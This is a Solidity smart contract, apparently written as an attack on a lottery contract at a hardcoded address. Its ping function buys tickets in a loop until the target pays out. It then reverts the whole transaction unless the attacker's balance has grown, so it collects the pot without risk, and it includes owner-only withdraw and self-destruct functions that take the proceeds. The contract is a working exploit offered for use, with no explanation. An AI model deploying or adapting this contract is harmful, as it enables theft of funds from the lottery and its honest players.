1 pragma solidity ^0.5.0;
2 
3 contract TargetInterface {
4     function AddTicket() public payable;
5 }
6 
7 contract Proxy_ChessLotto {
8     
9     address targetAddress = 0x309dFE127881922C356Fe8F571846150768C551e;
10     uint256 betSize = 0.00064 ether;
11 
12     address payable private owner;
13     
14     modifier onlyOwner {
15         require(msg.sender == owner);
16         _;
17     }
18     
19     constructor() public payable {
20         owner = msg.sender;
21     }
22     
23     function ping(bool _keepBalance) public payable onlyOwner {
24         uint256 targetBalanceInitial = address(targetAddress).balance;
25         uint256 existingBetsInitial = targetBalanceInitial / betSize;
26         require(existingBetsInitial > 0);
27         
28         uint256 ourBalanceInitial = address(this).balance;
29         
30         TargetInterface target = TargetInterface(targetAddress);
31     
32         uint256 ourBetCount = 64 - existingBetsInitial;
33 
34         for (uint256 ourBetIndex = 0; ourBetIndex < ourBetCount; ourBetIndex++) {
35             target.AddTicket.value(betSize)();
36             
37             if (address(targetAddress).balance < targetBalanceInitial) {
38                 break;
39             }
40         }
41         
42         require(address(this).balance > ourBalanceInitial);
43         
44         if (!_keepBalance) {
45             owner.transfer(address(this).balance);
46         }
47     }
48 
49     function withdraw() public onlyOwner {
50         owner.transfer(address(this).balance);
51     }    
52     
53     function kill() public onlyOwner {
54         selfdestruct(owner);
55     }    
56     
57     function () external payable {
58     }
59     
60 }